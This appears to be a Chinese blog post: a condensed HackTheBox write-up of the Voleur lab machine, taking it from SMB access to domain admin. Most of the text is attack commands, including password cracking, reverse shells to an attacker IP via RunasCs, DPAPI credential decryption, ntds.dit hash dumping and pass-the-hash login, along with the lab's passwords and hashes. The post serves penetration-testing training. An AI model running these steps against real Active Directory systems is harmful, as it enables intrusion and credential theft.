> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzYyNzQ1NA==&mid=2247485727&idx=1&sn=25609c3a578571d401536bb534e05ae7

#  HTB 第八赛季Voleur靶机：从SMB到域控 (速通版)  
原创 红队安全圈  红队安全圈   2025-07-08 13:29  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2IdFhJEZe3xn142fkub0qKjTM1ibSX2c5vSW1phLibySyU3giaJEUGXNbZt8vkFCt6D4qorttBWoOGZQ/640?wx_fmt=gif&from=appmsg "")  
  
hackthebox 第八赛季的新靶机 Voleur，需要熟悉SMB敏感文件泄露，Excel密码破解，kerberos票据，恢复删除用户，DPAPI提权，ntds解密，最终拿到域控权限。  
  
这篇文章只写主要攻击流程，有经验的师傅们可以跟着速通，如果希望有详细writeup请在评论区留言哦  
##### 靶机地址  
  
https://app.hackthebox.com/machines/670  
##### 适合读者  
  
√ 红队渗透测试人员  
  
√ 企业安全运维人员  
  
√ CTF竞赛战队  
  
√ 想掌握链式攻击思维的安全从业者  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2KH0sFeL9PSSricmstwaAIrbCpdVp8vYDJCiax1Mu9HfBVYyoM1GoakInOYY9YlakPVMHufosxFs67A/640?wx_fmt=other&from=appmsg "null")  
  
### User flag  
  
smb 探测  

```
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```

  
Excel破解  
  
破解出来是个密码本  

```
office2john Access_Review.xlsx > xlsx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt xlsx.hash
```

##### svc_winrm 用户  
  
kerberos客户端配置  

```
vi /etc/krb5.conf
```

  

```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    rdns = false

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

  
登录得到第一个 flag  

```
impacket-getTGT 'voleur.HTB/svc_winrm:AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2KH0sFeL9PSSricmstwaAIrbTNSlnEKHUl0HPfY5e1UIheic2VBia9OgyfZwOgmofdECQUyDMHOc377w/640?wx_fmt=other&from=appmsg "null")  
  
### Root flag  
##### Todd.Wolfe 用户  
  
反弹 svc_ldap shell  

```
.\RunasCs.exe svc_ldap M1X.....T5Vn cmd.exe -r 10.10.14.10:4446
```

  
查找并恢复删除的用户  

```
powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-....69db'
```

  
继续反弹shell 得到 Todd.Wolfe 权限  

```
.\RunasCs.exe Todd.Wolfe Nig.....on14 cmd.exe -r 10.10.14.10:4447
```

##### jeremy.combs 用户  
  
找到 DPAPI  
  
   
  

```
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
```

  
  
   
  
解密，得到 jeremy.combs 用户密码  

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

##### 域管  
  
反弹shell 拿到 jeremy.combs 交互权限  

```
.\RunasCs.exe jeremy.combs qT3V9...W4m cmd.exe -r 10.10.14.10:4448
```

  
找到WSL私钥和备份文件  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2KH0sFeL9PSSricmstwaAIrbX2icSyF3yUbFzWjgIhe3XPN7gpE6E6GtUlicFmJIT34LXbZmqxPMnhbw/640?wx_fmt=other&from=appmsg "null")  
  
  
拖回本地发现是域控的ntds和system等文件  

```
scp -i id_rsa -P 2222 -r &#34;svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups&#34; ./
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2KH0sFeL9PSSricmstwaAIrb35NSQEtnfQwia3IpolALE1SrQa7FRqetkumCvwQGABrt3rOPpqLqCoA/640?wx_fmt=other&from=appmsg "null")  
  
  
票据登录 administrator  

```
impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 'voleur.HTB/administrator'
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2KH0sFeL9PSSricmstwaAIrbDpnJKls5TG5Uy3yhaiaMTnH3mYZNIayHg8wldF8iaU5h0w6T2rTaNjkg/640?wx_fmt=other&from=appmsg "null")  
  
  
   
  
欢迎关注   
红队安全圈  
  
  
如果文章对你有帮助，欢迎给个  
一键四连吧  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2J3Ykl5xDepRoqkSBlQKAEIEx0DHiaQHx6sBYGNDAI6Eia2ZnZLLsHzD8yxEGEVbrzzTL4Shrf7iaWWw/640?wx_fmt=gif&from=appmsg "")  
  
